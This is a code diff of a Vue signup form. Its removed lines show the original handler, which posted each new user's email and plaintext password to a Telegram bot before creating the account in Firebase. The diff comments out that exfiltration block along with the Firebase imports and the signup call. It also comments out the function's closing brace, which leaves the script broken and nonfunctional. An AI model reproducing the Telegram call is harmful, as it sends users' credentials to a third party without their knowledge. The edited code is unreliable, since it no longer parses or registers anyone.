@@ -12,9 +12,9 @@
   
 <script setup>
 import { ref } from "vue";
-import firebase from 'firebase/compat/app';
-import 'firebase/compat/auth';
-import 'firebase/compat/firestore';
+// import firebase from 'firebase/compat/app';
+// import 'firebase/compat/auth';
+// import 'firebase/compat/firestore';
 
 const email = ref("");
 const password = ref("");
@@ -32,39 +32,39 @@ const signup = () => {
     }
 
     // Send data to Telegram bot (Replace with your Telegram bot token and chat_id)
-    const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
-    const chatId = "YOUR_TELEGRAM_CHAT_ID";
+//     const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
+//     const chatId = "YOUR_TELEGRAM_CHAT_ID";
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: `New user registered:\nEmail: ${email.value}\nPassword: ${password.value}`,
-        }),
-    })
-        .then((response) => response.json())
-        .then((data) => {
-            console.log("Message sent to Telegram bot:", data);
-        })
-        .catch((error) => {
-            console.error("Error sending message to Telegram bot:", error);
-        });
+//     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+//         method: 'POST',
+//         headers: {
+//             'Content-Type': 'application/json',
+//         },
+//         body: JSON.stringify({
+//             chat_id: chatId,
+//             text: `New user registered:\nEmail: ${email.value}\nPassword: ${password.value}`,
+//         }),
+//     })
+//         .then((response) => response.json())
+//         .then((data) => {
+//             console.log("Message sent to Telegram bot:", data);
+//         })
+//         .catch((error) => {
+//             console.error("Error sending message to Telegram bot:", error);
+//         });
 
-    firebase
-        .auth()
-        .createUserWithEmailAndPassword(email.value, password.value)
-        .then(
-            (user) => {
-                console.log(user);
-            },
-            (err) => {
-                alert(err.message);
-            }
-        );
-};
+//     firebase
+//         .auth()
+//         .createUserWithEmailAndPassword(email.value, password.value)
+//         .then(
+//             (user) => {
+//                 console.log(user);
+//             },
+//             (err) => {
+//                 alert(err.message);
+//             }
+//         );
+// };
 </script>
   
   <!-- Rest of the code remains unchanged -->
